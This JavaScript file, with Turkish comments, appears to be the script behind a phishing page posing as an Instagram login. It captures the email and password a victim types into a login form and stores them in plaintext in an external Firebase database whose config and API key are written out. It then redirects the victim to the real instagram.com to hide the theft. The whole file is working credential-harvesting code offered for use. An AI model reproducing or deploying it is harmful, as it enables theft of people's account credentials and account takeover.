

import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js';
import { getAuth } from 'https://www.gstatic.com/firebasejs/9.15.0/firebase-auth.js';
import { getDatabase, ref, set } from 'https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js';

const firebaseConfig = {
    apiKey: "AIzaSyCEI_O-rJQ4hhInAEwIk8zzCnbK4mxlBsY",
    authDomain: "inst-af91c.firebaseapp.com",
    databaseURL: "https://inst-af91c-default-rtdb.firebaseio.com/",
    projectId: "inst-af91c",
    storageBucket: "inst-af91c.appspot.com",
    messagingSenderId: "182310378714",
    appId: "1:182310378714:web:7c20d21f64abd6a18719e3"
};

// Firebase'i başlat
const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const database = getDatabase(app);

// Form gönderildiğinde verileri kaydetme işlemi
document.getElementById('loginForm').addEventListener('submit', function (event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Firebase'e kullanıcı verilerini kaydetme işlemi
    const userId = Date.now();  // Benzersiz bir ID oluşturmak için zaman damgası kullanılıyor
    set(ref(database, 'users/' + userId), {
        email: email,
        password: password
    }).then(() => {
        alert('User data saved!');
        window.location.href = 'https://www.instagram.com/';
    }).catch((error) => {
        console.error('Error saving data:', error);
    });
});
